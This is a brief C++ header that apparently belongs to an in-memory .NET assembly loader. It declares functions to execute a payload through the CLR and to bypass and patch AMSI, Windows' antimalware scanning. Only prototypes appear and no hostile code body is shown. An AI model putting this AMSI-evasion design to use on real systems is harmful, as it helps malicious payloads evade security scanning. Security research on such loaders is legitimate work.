#pragma once
#include <io.h>
#include <stdio.h>
#include <tchar.h>
#include <metahost.h>
#pragma comment(lib, "MSCorEE.lib")

#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")

using namespace mscorlib;

VOID Execute(LPVOID lpPayload);
BOOL FindVersion(void * assembly);
BOOL BypassAmsi();
VOID PatchAmsi();
BOOL ClrIsLoaded(LPCWSTR versione, IEnumUnknown* pEnumerator, LPVOID * pRuntimeInfo);
